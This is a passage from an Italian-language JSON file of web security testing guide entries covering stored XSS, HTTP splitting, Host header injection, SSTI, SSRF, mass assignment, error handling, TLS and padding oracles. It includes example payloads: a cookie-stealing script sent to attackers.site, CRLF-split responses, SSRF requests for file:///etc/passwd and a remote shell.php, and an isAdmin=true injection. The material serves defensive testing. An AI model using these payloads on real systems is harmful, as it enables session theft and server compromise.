post, commenti, blog. Un attaccante può salvare codice malevolo nella backend (ad esempio in un database), così da eseguirlo sui browser degli utenti che visitano la pagina vulnerabile sfruttando il livello di trust del sito.</li><li>SQL/XPATH injection che consentono di caricare contenuti nel database, successivamente recuperati come parte del contenuto attivo di una pagina web (es. XSS via SQLi).</li><li>Server malconfigurati che permettono l’upload e la pubblicazione di componenti attivi (es. WAR file su Tomcat, plugin su Plesk o CPanel).</li></ul><h3>Obiettivi del test</h3><ul><li>Identificare injection persistenti che necessitano di una fase di richiamo per essere attivate.</li><li>Comprendere come avviene il richiamo del vettore.</li><li>Impostare listener o attivare il richiamo se possibile.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Verificare i tipi di file che l’applicazione consente di caricare e la URL risultante dopo l’upload. Caricare un file che sfrutti una vulnerabilità o una debolezza del componente che lo visualizza o lo gestisce sul client. Indurre la vittima (es. via email) a visitare la pagina che visualizza o scarica il file. Se il file contiene un exploit, questo verrà eseguito quando l’utente accederà alla pagina o scaricherà il file dal sito “trusted”.</p><p>Spesso questi scenari sfruttano XSS persistente veicolato tramite SQL Injection. Si parte identificando una vulnerabilità di SQLi e si verifica quali valori possono essere iniettati in modo persistente (ad esempio, una tabella che gestisce i footer delle pagine, modificando un campo visualizzato dagli utenti). Iniettando codice JavaScript in un campo persistente, ogni utente che visualizza la pagina invierà, ad esempio, i propri cookie all’attaccante.</p><p>Esempio di query di injection:</p><pre><code>UPDATE footer SET notice = 'Copyright 1999-2030<script>document.write('<img src=\"https://attackers.site/cv.jpg?'+document.cookie+'\">')</script>' WHERE notice = 'Copyright 1999-2030';</code></pre><p>Altri casi includono la possibilità di caricare una webapp malevola su server amministrabili via console, sfruttando credenziali deboli o ottenute via attacco. Un file WAR caricato su Tomcat permette di deployare codice eseguibile lato server, accessibile dagli utenti come una pagina legittima.</p><p>Anche la possibilità di modificare direttamente i file del webroot (tramite vulnerabilità locali, escalation o configurazioni errate) consente di piazzare payload persistenti nelle pagine del sito.</p><p>Le tecniche di testing gray-box e white-box sono simili a quelle per altre injection: si analizza la validazione in input/output e la persistenza dei dati. Se altri sistemi condividono lo stesso database, un attaccante potrebbe inserire dati malevoli da un canale secondario (“backdoor” persistence). La mitigazione prevede validazione sia in input che in output, codificando opportunamente ogni dato prima di visualizzarlo lato client.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>XSS-proxy</li><li>Burp Suite</li><li>ZAP</li><li>Metasploit</li></ul><h3>Riferimenti</h3><p>Valgono tutte le fonti sulla XSS, in particolare sulle stored XSS e le persistence-based attack chain.</p><ul><li>CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests</li><li>Blackboard Academic Suite 6.2.23: Vulnerabilità XSS persistente</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INPV-15": {
      "summary": "<h3>Riassunto</h3><p>Questa sezione illustra esempi di attacchi che sfruttano specificità del protocollo HTTP, sia abusando di debolezze nell’applicazione che di differenze di interpretazione degli agenti coinvolti nella comunicazione HTTP. Gli attacchi principali trattati sono:</p><ul><li>HTTP splitting</li><li>HTTP smuggling</li></ul><p>L’HTTP splitting sfrutta la mancata validazione di caratteri CR e LF nei valori di header generati dinamicamente dall’applicazione, permettendo all’attaccante di iniettare una sequenza di risposta “spezzata” che viene interpretata come due messaggi HTTP distinti. Può essere sfruttato per attacchi di cache poisoning, XSS e altri vettori su componenti intermedi come proxy e cache.</p><p>L’HTTP smuggling sfrutta differenze nei parser HTTP (tra server, proxy, firewall, etc.) che interpretano lo stesso pacchetto HTTP in modo diverso, permettendo a un attaccante di “infilare” una richiesta malevola oltre i sistemi di protezione. Questo richiede conoscenza delle implementazioni e viene approfondito principalmente in scenari gray-box.</p><h3>Obiettivi del test</h3><ul><li>Verificare se l’applicazione è vulnerabile all’HTTP splitting e quali attacchi sono possibili.</li><li>Verificare se la catena di comunicazione è vulnerabile all’HTTP smuggling e quali attacchi sono possibili.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Molte applicazioni usano input utente per generare header HTTP, ad esempio nelle redirezioni tramite Location. Se non vengono filtrati i caratteri CRLF, un attaccante può iniettare %0d%0a (sequenza CRLF) e inserire una nuova risposta HTTP, causando lo “split” della risposta originale in due. Un esempio classico è l’iniezione nella Location header di una redirezione, portando a cache poisoning o XSS.</p><p>Ad esempio, passando come parametro:</p><pre><code>advanced%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a&lt;html&gt;Sorry, System Down&lt;/html&gt;</code></pre><p>Si ottiene una risposta composta che una cache HTTP può interpretare come due risposte, permettendo di “avvelenare” la cache o sostituire contenuti.</p><p>Le intestazioni più soggette sono Location e Set-Cookie. La riuscita dell’attacco dipende dalle modalità di parsing e dalle policy del target; alcune implementazioni richiedono padding o exploit di particolarità come la lunghezza dei pacchetti.</p><p>L’HTTP smuggling invece sfrutta il diverso parsing di header ambigui (ad esempio Content-Length multipli o header fuori standard) da parte di diversi agenti. Un esempio storico coinvolge IIS 5.0, che tronca le richieste POST superiori a 48KB, permettendo di nascondere richieste malevole nella coda dei pacchetti HTTP e superare il filtro di un firewall HTTP.</p><p>Per identificare queste vulnerabilità occorre individuare tutti i punti in cui l’input utente influenza uno o più header di risposta e verificare se è possibile iniettare CRLF. I casi di HTTP smuggling richiedono anche la verifica delle differenze tra proxy, reverse proxy e web server.</p><h3>Riferimenti</h3><ul><li>Amit Klein: Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics</li><li>Amit Klein: HTTP Message Splitting, Smuggling and Other Animals</li><li>Amit Klein: HTTP Request Smuggling - ERRATA</li></ul>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INPV-16": {
      "summary": "<h3>Riassunto</h3><p>Questa sezione descrive come monitorare tutte le richieste HTTP in ingresso e in uscita sia lato client che lato server. Lo scopo è identificare eventuali richieste HTTP sospette o non necessarie inviate in background.</p><p>La maggior parte degli strumenti di sicurezza per il testing delle web app (come AppScan, Burp Suite, ZAP) agisce come HTTP proxy, ma ciò comporta modifiche alla configurazione del client/browser. Le tecniche qui illustrate si focalizzano invece sul monitoraggio del traffico HTTP senza modificare le impostazioni dei client, così da simulare un ambiente di produzione reale.</p><h3>Obiettivi del test</h3><ul><li>Monitorare tutte le richieste HTTP in entrata e in uscita verso il Web Server, ispezionando richieste sospette.</li><li>Monitorare il traffico HTTP senza alterare proxy o configurazione lato client finale.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Se non si può modificare la configurazione del browser o del client, è possibile installare un reverse proxy lato server per monitorare tutte le richieste. Su Windows si può usare Fiddler Classic, che consente anche la modifica e il replay delle richieste. Su Linux è consigliato Charles Proxy.</p><p>Un’altra tecnica è il port forwarding: consente di intercettare il traffico HTTP reindirizzandolo verso una porta monitorata senza cambiare nulla lato client. Charles può funzionare come SOCKS proxy per questo scopo, oppure si possono usare tool dedicati di port forwarding. In questo modo si analizza il traffico TCP a livello di rete.</p><p>TCPDump o Wireshark sono utili per catturare tutto il traffico TCP, anche se non consentono la modifica e il replay delle richieste HTTP. In questi casi, Ostinato può essere usato per inviare nuovamente i pacchetti catturati (PCAP replay).</p><p>Per traffico HTTPS, Wireshark richiede la chiave privata del web server per decifrare i dati trasmessi; in caso contrario, il payload resterà cifrato. Fiddler o Charles invece permettono di ispezionare e modificare facilmente anche il traffico HTTPS generando CA temporanee (mitm proxy).</p>",
      "tools": "<h3>Strumenti</h3><ul><li>Fiddler</li><li>Charles Web Debugging Proxy</li><li>TCPProxy</li><li>WireShark</li><li>Ostinato</li><li>PowerEdit-Pcap</li><li>pcapteller</li><li>replayproxy</li></ul><h3>Riferimenti</h3><ul><li>Charles Web Debugging Proxy</li><li>Fiddler</li><li>TCPDUMP</li><li>Ostinato</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INPV-17": {
      "summary": "<h3>Riassunto</h3><p>Un web server ospita spesso più applicazioni web sullo stesso indirizzo IP, identificandole tramite il virtual host (header Host). Se il valore di questo header non viene validato correttamente, un attaccante può manipolarlo per:</p><ul><li>Forzare il server a inviare la richiesta al primo virtual host disponibile.</li><li>Effettuare redirect verso un dominio controllato.</li><li>Effettuare cache poisoning su proxy o CDN.</li><li>Manipolare funzionalità di reset password.</li><li>Accedere a virtual host non destinati a essere pubblici.</li></ul><h3>Obiettivi del test</h3><ul><li>Verificare se l’header Host viene parsato dinamicamente dall’applicazione.</li><li>Bypassare controlli di sicurezza che si basano su tale header.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Il primo test consiste nell’inviare una richiesta HTTP alterando l’header Host (es: Host: www.attacker.com). In base a come il web server lo gestisce, è possibile ottenere un redirect, la risposta di un virtual host inatteso o la riscrittura di link e risorse nella risposta.</p><pre><code>GET / HTTP/1.1\nHost: www.attacker.com\n</code></pre><p>Un attacco comune è sfruttare la generazione dinamica dei link di reset password. Se il link contiene il dominio preso dall’header Host, un attaccante può ricevere il token di reset a un proprio dominio, compromettendo l’account della vittima.</p><pre><code>$reset_url = \"https://\" . $_SERVER [ 'HTTP_HOST' ] . \"/reset.php?token=\" . $token ;</code></pre><p>Inoltre, dove l’header Host è filtrato, spesso si può provare a inserire il dominio malevolo nell’header X-Forwarded-Host. Questo è spesso utilizzato da reverse proxy (come Nginx, AWS ELB) per segnalare l’host originale.</p><pre><code>Host: www.example.com\nX-Forwarded-Host: www.attacker.com\n</code></pre><p>Un’ulteriore tecnica permette di accedere a virtual host interni (“split-horizon DNS”): anche se intranet.example.org non risolve pubblicamente, una richiesta con Host: intranet.example.org potrebbe essere processata dal server se la risoluzione interna è presente.</p>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INPV-18": {
      "summary": "<h3>Riassunto</h3><p>Le applicazioni web moderne usano spesso motori di template lato server (es: Jinja2, Twig, FreeMarker) per generare HTML dinamico. Una vulnerabilità di Server-Side Template Injection (SSTI) si verifica quando input dell’utente viene inserito senza filtri in un template, portando a potenziale esecuzione di codice remoto sul server. Sono particolarmente esposti sistemi che permettono markup personalizzati, wiki, CMS, aree di recensione, ecc.</p><h3>Obiettivi del test</h3><ul><li>Rilevare punti vulnerabili a template injection.</li><li>Identificare il motore di template utilizzato.</li><li>Costruire un exploit ad hoc.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>La SSTI può essere testata sia in contesto di testo libero sia in contesto di codice (ad esempio, quando input utente viene inserito come variabile in una espressione del template). Si inizia inviando espressioni di template tipiche dei vari motori ({ { 7*7 } }, ${7*7}, <% 7*7 %>, ecc.) e osservando la risposta del server. Se la risposta viene valutata (es: “49”), si è in presenza di SSTI.</p><p>In contesti più restrittivi, si cerca di “uscire” dal contesto previsto (es: chiudendo parentesi o delimitatori) e iniettare codice o HTML arbitrario. Identificato il motore di template (ad esempio Jinja2, Twig, Velocity), si cerca la documentazione e si individuano oggetti e metodi accessibili che possano portare a escalation (es: accesso a variabili di ambiente, file system, ecc.). Strumenti come Tplmap e Burp Extension Backslash Powered Scanner aiutano a identificare e sfruttare SSTI automaticamente.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>Tplmap</li><li>Burp Backslash Powered Scanner</li></ul><h3>Riferimenti</h3><ul><li>James Kettle: Server-Side Template Injection: RCE for the modern webapp</li><li>PortSwigger: Server-Side Template Injection</li><li>Exploring SSTI in Flask/Jinja2</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INPV-19": {
      "summary": "<h3>Riassunto</h3><p>Le web application interagiscono spesso con risorse interne o esterne. Se i dati inviati dall’utente non sono gestiti correttamente, si possono generare condizioni di Server-Side Request Forgery (SSRF). Un attacco SSRF può permettere a un attaccante di accedere ad azioni riservate, servizi interni, file di sistema, o in certi casi portare a RCE.</p><h3>Obiettivi del test</h3><ul><li>Identificare i punti vulnerabili a SSRF.</li><li>Verificare se i punti individuati sono effettivamente sfruttabili.</li><li>Valutare la gravità della vulnerabilità.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Il test SSRF consiste nel tentare di forzare il server a caricare o salvare risorse arbitrariamente controllate. Tipicamente si testa la possibilità di accedere sia a risorse remote (es: shell.php su dominio attaccante) sia locali (file:///etc/passwd, http://localhost/admin, http://127.0.0.1). L’obiettivo è accedere a servizi e interfacce non esposti pubblicamente.</p><pre><code>GET /page?page=https://malicioussite.com/shell.php\nGET /page?page=http://localhost/admin\nGET /page?page=file:///etc/passwd</code></pre><p>In presenza di filtri che bloccano localhost/127.0.0.1, si possono usare notazioni alternative per l’IP (decimale, ottale, IP abbreviato) o registrare un dominio che risolve su 127.0.0.1. Un altro vettore è sfruttare funzionalità che convertono file (es: upload con <img> o <iframe> che puntano a servizi interni).</p><p>Altre tecniche includono bypass con “@” (userinfo separator), “#” (frammento URL), encoding e fuzzing vari. L’SSRF può anche essere cieco (blind SSRF), ovvero la risposta non è immediatamente visibile, ma la vulnerabilità si manifesta tramite altri canali (log, email, PDF, servizi lato backend).</p>",
      "tools": "",
      "remediation": "<h3>Mitigazione</h3><p>La mitigazione SSRF si basa principalmente su allow list rigorose di IP e URL, evitare che input utente venga usato direttamente in richieste server-side, e implementare controlli di rete aggiuntivi (es: firewall, segmentazione).</p><h3>Riferimenti</h3><ul><li>OWASP SSRF Prevention Cheat Sheet</li><li>swisskyrepo: SSRF Payloads</li><li>Portswigger: SSRF</li></ul>",
      "test_objectives": ""
    },
    "WSTG-INPV-20": {
      "summary": "<h3>Riassunto</h3><p>Le applicazioni web moderne si basano spesso su framework che permettono il binding automatico dei parametri della richiesta HTTP su oggetti interni. Questa funzionalità, detta *autobinding* o *model binding*, può essere sfruttata per modificare campi che non dovevano essere accessibili esternamente, con rischio di privilege escalation, manipolazione dei dati, bypass di controlli di sicurezza e altro. Questa condizione prende il nome di *Mass Assignment*.</p><p>Esempi di proprietà sensibili:</p><ul><li>Proprietà legate ai permessi: dovrebbero essere settate solo da utenti privilegiati (es. <code>is_admin</code>, <code>role</code>, <code>approved</code>).</li><li>Proprietà di stato: dovrebbero essere modificate solo da processi interni (es. <code>balance</code>, <code>status</code>, <code>email_verified</code>).</li><li>Proprietà interne: dovrebbero essere gestite solo dall’applicazione (es. <code>created_at</code>, <code>updated_at</code>).</li></ul><h3>Obiettivi del test</h3><ul><li>Individuare richieste che modificano oggetti.</li><li>Verificare se è possibile modificare campi che non dovrebbero essere accessibili esternamente.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Un esempio classico: supponiamo un’applicazione Java con una classe User simile a:</p><pre><code>public class User { private String username; private String password; private String email; private boolean isAdmin; // Getters & Setters }</code></pre><p>La creazione di un nuovo utente avviene tramite:</p><pre><code><form action=\"/createUser\" method=\"POST\">\n  <input name=\"username\" type=\"text\">\n  <input name=\"password\" type=\"text\">\n  <input name=\"email\" type=\"text\">\n  <input type=\"submit\" value=\"Create\">\n</form></code></pre><p>Il controller mappa automaticamente i parametri della richiesta sull’oggetto User:</p><pre><code>@RequestMapping(value = \"/createUser\", method = RequestMethod.POST)\npublic String createUser(User user) {\n  userService.add(user);\n  return \"successPage\";\n}</code></pre><p>Un attaccante può aggiungere arbitrariamente il parametro <code>isAdmin</code> nella POST:</p><pre><code>POST /createUser\nusername=bob&password=supersecret&email=bob@example.com&isAdmin=true</code></pre><p>L’utente verrà così creato con privilegi amministrativi.</p><p>Per individuare vulnerabilità di mass assignment, occorre:</p><ul><li>Elencare tutte le richieste che permettono la creazione o modifica di oggetti (tipicamente POST/PUT).</li><li>Osservare parametri “insospettabili” (es: <code>user[role]</code>, <code>user[isAdmin]</code>, <code>role</code>, <code>admin</code>), anche se non previsti dal frontend.</li></ul><p>Un indicatore tipico è la presenza di input con notazione a parentesi (es: <code>user[foo]</code>). Si possono aggiungere campi non previsti (es: <code>user[nonexisting]</code>) per vedere se l’applicazione restituisce errori o se ignora il campo. Errori 500 o stack trace spesso aiutano a scoprire nomi di attributi interni e relativi tipi di dato.</p><p>In black-box, analizza anche:</p><ul><li>Sorgente HTML/JS della pagina</li><li>Risposte API (JSON/XML con tutti i campi dell’oggetto)</li></ul><p>Se per esempio una API <code>GET /profile</code> restituisce:</p><pre><code>{ \"_id\": 12345, \"username\": \"bob\", \"age\": 38, \"isAdmin\": false }</code></pre><p>… prova a modificare <code>isAdmin</code> in una richiesta di modifica o creazione.</p><p>Automatizza la ricerca con wordlist di parametri sensibili (<code>is_admin</code>, <code>role</code>, <code>approved</code>, ecc.) usando strumenti di fuzzing come Burp Intruder, ZAP Fuzzer, wfuzz. Il file <code>common-columns.txt</code> di sqlmap contiene molti nomi utili per l’enumerazione.</p><p>Confronta anche le richieste inviate da utenti con diversi privilegi: se quelle di un admin includono parametri aggiuntivi, verifica se puoi riutilizzarli come utente normale.</p><p>Gli impatti variano: escalation verticale dei privilegi, corruzione dati, DoS (modificando <code>id</code> o <code>status</code>), bypass di workflow.</p><p>In gray-box, puoi ispezionare direttamente codice e modelli: cerca pattern di autobinding senza restrizioni (es: Spring MVC con DataBinder senza <code>setAllowedFields</code>/<code>setDisallowedFields</code>, Eloquent ORM senza <code>$fillable</code>/<code>$guarded</code>, ASP.NET Model Binding senza restrizioni su <code>Bind</code> o proprietà <code>ReadOnly</code>).</p>",
      "tools": "",
      "remediation": "<h3>Mitigazione</h3><p>Usa sempre le funzionalità dei framework per definire esplicitamente quali campi sono bindabili (<code>allowed fields</code> o <code>$fillable</code>). Meglio dichiarare solo i campi che l’utente può modificare, anziché affidarsi a una deny-list. Adotta architetture che usano DTO (Data Transfer Object) per separare i dati ricevuti dai dati interni. Evita binding diretto dei dati utente sugli oggetti business-critical.</p><h3>Riferimenti</h3><ul><li>OWASP: API Security</li><li>OWASP Cheat Sheet Series</li><li>CWE-915</li></ul>",
      "test_objectives": ""
    },
    "WSTG-ERRH-01": {
      "summary": "<h3>Riassunto</h3><p>Tutte le tipologie di applicazioni (web app, web server, database, ecc.) generano errori per molteplici motivi. Spesso gli sviluppatori trascurano la gestione corretta degli errori o danno per scontato che l’utente non tenterà mai di provocare situazioni anomale (es. inserendo una stringa dove ci si aspetta un intero). Se ci si concentra solo sul funzionamento normale ('happy path'), si ignora la varietà di input che l’utente può inviare e che il codice potrebbe non gestire.</p><p>Gli errori possono manifestarsi come:</p><ul><li>stack trace,</li><li>timeout di rete,</li><li>mismatch di input,</li><li>memory dump.</li></ul><p>Una gestione impropria degli errori può consentire ad un attaccante di:</p><ul><li>Comprendere le API e i servizi interni utilizzati.</li><li>Mappare l’architettura interna e le tecnologie, facilitando attacchi a catena.</li><li>Raccogliere informazioni su versioni e tipologie di applicazioni e servizi utilizzati.</li><li>Provocare un Denial of Service (DoS) mandando il sistema in deadlock o in crash tramite eccezioni non gestite.</li><li>Bypassare controlli sfruttando eccezioni non previste dai flussi logici.</li></ul><h3>Obiettivi del test</h3><ul><li>Individuare tutti i messaggi di errore esposti dall’applicazione.</li><li>Analizzare le differenti risposte e output di errore restituiti.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Gli errori sono spesso considerati innocui, perché forniscono informazioni utili a sviluppatori e utenti per diagnosticare problemi. Tuttavia, forzando condizioni anomale, l’applicazione può rivelare dettagli interni non previsti se non vengono adottate contromisure specifiche.</p><p>Le web app girano sempre su un web server (Nginx, Apache, IIS, ecc.), che hanno messaggi di errore noti e standardizzati. Conoscere questi messaggi (anche tramite test su installazioni locali) aiuta a riconoscere tecnologia, versione e possibili misconfigurazioni.</p><p>Per forzare la generazione di errori dal server:</p><ul><li>Cercare file o directory inesistenti per ottenere errori 404.</li><li>Richiedere directory protette per ottenere errori 403, pagine bianche o listing directory non voluti.</li><li>Inviare richieste che violano la RFC HTTP (es. path troppo lunghi, header malformati, HTTP version errata). Anche se l’applicazione gestisce gli errori, una richiesta anomala può far emergere errori direttamente dal web server sottostante se lo sviluppatore ha dimenticato di sovrascrivere la gestione degli errori.</li></ul><p>Le applicazioni personalizzate sono generalmente più soggette a restituire stack trace, memory dump, eccezioni gestite male e messaggi di errore generici dovuti all’assenza di un meccanismo globale di cattura delle eccezioni. Spesso questi errori rivelano dettagli sensibili come percorsi locali, query SQL, struttura degli oggetti o chiamate interne.</p><p>Per generare errori a livello applicativo:</p><ul><li>Il fuzzing massivo di tutti gli input non è sempre praticabile: meglio selezionare quelli più promettenti (es. chiusura anticipata di un body JSON, stringhe troppo lunghe, CLRF injection, caratteri speciali non permessi in filename, ecc.).</li><li>Alternare dati validi e invalidi secondo il contesto del campo testato (es. in parametri numerici, inviare stringhe alfanumeriche o caratteri speciali).</li><li>Fuzzare tipi di dato 'edge-case' che possano causare errori di parsing o di cast.</li></ul><p>I messaggi di errore sono spesso la principale debolezza nel mappare architetture, in particolare in ambienti a microservizi: errori diversi per endpoint diversi permettono di capire la suddivisione e il comportamento dei servizi interni.</p><p>Attenzione alla forma della risposta: alcuni errori sono mascherati dietro risposte di successo (HTTP 200 con body di errore), redirect (HTTP 302), o custom error page che rivelano comunque dettagli tecnici.</p>",
      "tools": "",
      "remediation": "<h3>Mitigazione</h3><p>Per la mitigazione, fare riferimento a: Proactive Controls C10 e la <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html\">Error Handling Cheat Sheet</a>.</p><h3>Playground</h3><ul><li>Juice Shop – Error Handling</li></ul><h3>Riferimenti</h3><ul><li>WSTG: Appendix C - Fuzzing</li><li>Proactive Controls C10: Gestire tutti gli errori e le eccezioni</li><li>ASVS v4.1 v7.4: Error handling</li><li>CWE 728 – Improper Error Handling</li><li>OWASP Cheat Sheet Series: Error Handling</li></ul>",
      "test_objectives": ""
    },
    "WSTG-ERRH-02": {
      "summary": "",
      "how-to": "",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CRYP-01": {
      "summary": "<h3>Riassunto</h3><p>Quando le informazioni vengono scambiate tra client e server, devono essere cifrate e protette per evitare che un attaccante possa leggerle o modificarle. Questo avviene tipicamente tramite HTTPS, che si basa sul protocollo TLS (Transport Layer Security), evoluzione del vecchio SSL. Oltre a cifrare il traffico, TLS permette anche al server di autenticarsi tramite certificato digitale, garantendo al client di essersi collegato al server legittimo.</p><p>Nel tempo sono state scoperte numerose vulnerabilità sia nei protocolli SSL/TLS, sia nei cipher suite utilizzati, sia nelle implementazioni. Di conseguenza, è fondamentale verificare non solo la presenza di TLS, ma anche che la configurazione sia robusta e aggiornata.</p><h3>Obiettivi del test</h3><ul><li>Validare la configurazione del servizio.</li><li>Verificare la robustezza e validità del certificato digitale.</li><li>Accertarsi che la sicurezza TLS non sia aggirabile e che sia applicata su tutta l’applicazione.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Le problematiche legate alla sicurezza del trasporto si suddividono in vari ambiti:</p><ul><li>**Versioni obsolete di protocollo**: SSLv2 (DROWN), SSLv3 (POODLE), TLSv1.0 (BEAST), TLSv1.1 (deprecato)</li><li>**Cipher suite deboli**: EXPORT ciphers (FREAK), NULL ciphers (autenticazione ma nessuna cifratura), cipher RC4 (NOMORE), cipher CBC (BEAST, Lucky 13), chiavi DHE deboli (LOGJAM)</li><li>**Compressione TLS**: (CRIME)</li></ul><p>Le raccomandazioni aggiornate sono disponibili nella <a href=\"https://wiki.mozilla.org/Security/Server_Side_TLS\">Mozilla Server Side TLS Guide</a>.</p><p>Molti di questi attacchi richiedono scenari di tipo Man-in-the-Middle (MitM) e grandi risorse, ma vanno comunque segnalati come rischi per applicazioni critiche o pubbliche.</p><p>Verifiche sul certificato digitale:</p><ul><li>La chiave deve essere almeno a 2048 bit.</li><li>L’algoritmo di firma deve essere almeno SHA-256 (evitare MD5, SHA-1).</li><li>Il certificato deve essere valido (periodo di validità, CA affidabile: pubblica per applicazioni pubbliche, interna per sistemi aziendali).</li><li>Il campo Subject Alternative Name (SAN) deve corrispondere all’hostname. Il campo Common Name (CN) non è più considerato dai browser moderni.</li><li>Attenzione ai wildcard certificate (es. *.example.org): sono comodi ma possono esporre a rischi se compromesso uno dei sottodomini.</li><li>I certificati possono rivelare informazioni su infrastruttura interna (es. nomi host interni in Issuer o SAN).</li></ul><p>Vulnerabilità note nelle implementazioni TLS (esempi):</p><ul><li>Debian OpenSSL predictable RNG (CVE-2008-0166)</li><li>OpenSSL Heartbleed (CVE-2014-0160)</li><li>OpenSSL Insecure Renegotiation (CVE-2009-3555)</li><li>Microsoft Schannel DoS (CVE-2014-6321)</li></ul><p>L’applicazione deve inoltre:</p><ul><li>Non trasmettere dati sensibili su canali non cifrati (WSTG-CRYP-03)</li><li>Impostare header HTTP Strict-Transport-Security (HSTS, vedi WSTG-CONF-07)</li><li>Impostare il flag Secure sui cookie (WSTG-SESS-02)</li></ul><p>**Mixed content:** caricare risorse attive (JS, CSS) via HTTP su pagine HTTPS è pericoloso (esecuzione codice da attaccante), mentre risorse passive (immagini) possono causare leak o defacement. I browser moderni bloccano il mixed active content.</p><p>**Redirect HTTP→HTTPS:** molti siti accettano connessioni HTTP e redirigono subito su HTTPS. Tuttavia, un attaccante potrebbe intercettare la richiesta iniziale e deviare l’utente verso un sito malevolo (sslstrip). È fondamentale configurare HSTS e, dove possibile, richiedere il preload.</p><h3>Testing automatico</h3><p>Strumenti utili per identificare debolezze nella configurazione SSL/TLS:</p><ul><li>**Nmap** (script ssl-enum-ciphers, ssl-cert)</li><li>**sslscan**, **sslyze**</li><li>**testssl.sh**</li><li>**SSL Labs** di Qualys (web)</li><li>**OWASP O-Saft**</li></ul><p>Per verifiche manuali: openssl s_client, gnutls-cli.</p><p>**Nota:** Le versioni moderne di OpenSSL/GnuTLS non supportano più SSLv2/EXPORT ciphers; testare con versioni compatibili per evitare falsi negativi.</p><p>I browser moderni forniscono nei dev tools dettagli su protocollo/cipher usati e avvisi sui certificati non affidabili.</p><h3>Riferimenti</h3><ul><li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html\">OWASP Transport Layer Protection Cheat Sheet</a></li><li><a href=\"https://wiki.mozilla.org/Security/Server_Side_TLS\">Mozilla Server Side TLS Guide</a></li></ul>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CRYP-02": {
      "summary": "<h3>Riassunto</h3><p>Un padding oracle è una funzione di un'applicazione che decifra dati cifrati forniti dal client (ad esempio lo stato di sessione interno memorizzato sul client) e rivela lo stato di validità del padding dopo la decifratura. L'esistenza di un padding oracle consente a un attaccante di decifrare dati cifrati e cifrare dati arbitrari senza conoscere la chiave utilizzata per queste operazioni crittografiche. Questo può portare alla fuga di dati sensibili o a vulnerabilità di escalation dei privilegi, se l'integrità dei dati cifrati è presunta dall'applicazione.</p><p>I cifrari a blocchi cifrano i dati solo in blocchi di dimensioni specifiche. Le dimensioni dei blocchi comunemente usate sono 8 e 16 byte. Se i dati non corrispondono a un multiplo della dimensione del blocco, devono essere aggiunti dei padding in modo specifico, così che il decifratore possa rimuoverli correttamente. Uno schema di padding comune è PKCS#7, che riempie i byte rimanenti con il valore della lunghezza del padding.</p><p>Se il padding è lungo 5 byte, il valore del byte 0x05 viene ripetuto cinque volte dopo il testo in chiaro.</p><p>Si verifica una condizione di errore se il padding non corrisponde alla sintassi dello schema di padding utilizzato. Un padding oracle è presente se un'applicazione rivela questo errore specifico per dati cifrati forniti dal client. Questo può avvenire esponendo eccezioni (es. BadPaddingException in Java) direttamente, tramite differenze sottili nelle risposte inviate al client o tramite canali laterali come il timing delle risposte.</p><p>Alcune modalità operative dei cifrari consentono attacchi di bit-flipping, dove il cambio di un bit nel testo cifrato provoca il cambio del bit corrispondente nel testo in chiaro. Cambiare un bit nel blocco n-esimo di dati cifrati in modalità CBC provoca la modifica dello stesso bit nel blocco (n+1)-esimo dei dati decifrati. Il blocco n dei dati decifrati risulterà danneggiato da questa manipolazione.</p><p>L'attacco padding oracle permette a un attaccante di decifrare dati cifrati senza conoscere la chiave di cifratura, inviando testi cifrati manipolati al padding oracle e osservando le risposte. Questo comporta una perdita di confidenzialità dei dati cifrati. Ad esempio, nel caso di dati di sessione memorizzati lato client, l'attaccante può ottenere informazioni sullo stato e la struttura interna dell'applicazione.</p><p>Un attacco padding oracle consente inoltre a un attaccante di cifrare testi in chiaro arbitrari senza conoscere la chiave o il cifrario. Se l'applicazione presume l'integrità e autenticità dei dati decifrati, l'attaccante potrebbe riuscire a manipolare lo stato interno della sessione e ottenere privilegi più elevati.</p><h3>Obiettivi del test</h3><ul><li>Identificare messaggi cifrati che si basano sul padding.</li><li>Tentare di violare il padding dei messaggi cifrati e analizzare i messaggi di errore restituiti per ulteriori analisi.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Prima di tutto occorre identificare i possibili punti di input per il padding oracle. Generalmente devono essere soddisfatte le seguenti condizioni:</p><p>Dg6W8OiWMIdVokIDH15T/A==, dopo decodifica base64, diventa 0e 0e 96 f0 e8 96 30 87 55 a2 42 03 1f 5e 53 fc. Sembra un valore casuale di 16 byte.</p><p>Se viene identificato un valore di input candidato, si deve verificare il comportamento dell'applicazione quando questo valore cifrato viene manipolato a livello di bit. Normalmente questo valore codificato in base64 include l'IV (Initialization Vector) anteposto al testo cifrato. Dato un testo in chiaro p e un cifrario con blocchi di dimensione n, il numero di blocchi sarà b = ceil(lunghezza(p)/n). La lunghezza della stringa cifrata sarà y = (b+1)*n a causa dell'IV. Per verificare la presenza di un oracle, decodificare la stringa, cambiare l'ultimo bit del penultimo blocco b-1 (il bit meno significativo del byte a y-n-1), ricodificare e inviare. Successivamente, decodificare la stringa originale, cambiare l'ultimo bit del blocco b-2 (il bit meno significativo del byte a y-2*n-1), ricodificare e inviare.</p><p>Se si sa che la stringa cifrata è un singolo 